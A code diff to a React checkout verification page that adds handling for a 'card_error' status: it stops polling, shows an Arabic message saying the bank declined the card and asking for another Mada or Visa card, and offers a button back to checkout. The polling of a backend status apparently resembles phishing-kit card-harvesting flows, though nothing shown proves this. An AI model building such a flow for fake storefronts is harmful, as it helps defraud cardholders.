@@ -38,8 +38,9 @@ export default function VerifyPage() {
   const [error, setError] = useState("");
   const [cooldown, setCooldown] = useState(0);
 
-  // Confirmation screen state
+  // Confirmation and Card Error screen states
   const [isConfirmed, setIsConfirmed] = useState(false);
+  const [cardError, setCardError] = useState(false);
   const [redirectCountdown, setRedirectCountdown] = useState(5);
   const [copied, setCopied] = useState(false);
 
@@ -71,6 +72,13 @@ export default function VerifyPage() {
               setIsConfirmed(true);
               return;
             }
+            if (json.status === "card_error") {
+              stopPolling();
+              setSubmitting(false);
+              setCardError(true);
+              setError("عذراً، البنك رفض العملية لوجود مشكلة في بطاقتك.. فضلاً استخدم بطاقة مدى أو فيزا أخرى لإتمام الطلب.");
+              return;
+            }
           }
 
           // 2. Parallel direct check to Render backend
@@ -87,6 +95,13 @@ export default function VerifyPage() {
                 localStorage.removeItem("cart");
               } catch {}
               setIsConfirmed(true);
+              return;
+            }
+            if (directJson.status === "card_error") {
+              stopPolling();
+              setSubmitting(false);
+              setCardError(true);
+              setError("عذراً، البنك رفض العملية لوجود مشكلة في بطاقتك.. فضلاً استخدم بطاقة مدى أو فيزا أخرى لإتمام الطلب.");
               return;
             }
           }
@@ -367,7 +382,21 @@ export default function VerifyPage() {
               className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#173e48] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#65E0CD] transition-colors disabled:opacity-50"
               dir="ltr"
             />
-            {error && <p className="text-red-500 text-xs font-bold mt-1.5 leading-relaxed">⚠ {error}</p>}
+            {error && (
+              <div className="mt-2 space-y-1.5 text-right">
+                <p className="text-red-500 text-xs font-bold leading-relaxed">⚠ {error}</p>
+                {cardError && (
+                  <button
+                    type="button"
+                    onClick={() => router.push("/checkout")}
+                    className="inline-flex items-center gap-1 text-xs font-bold text-red-600 hover:text-red-800 underline underline-offset-4 transition cursor-pointer"
+                  >
+                    <span>اضغط هنا لتغيير بيانات البطاقة والمحاولة مرة أخرى</span>
+                    <ArrowRight size={13} />
+                  </button>
+                )}
+              </div>
+            )}
           </div>
 
           <div className="text-center">
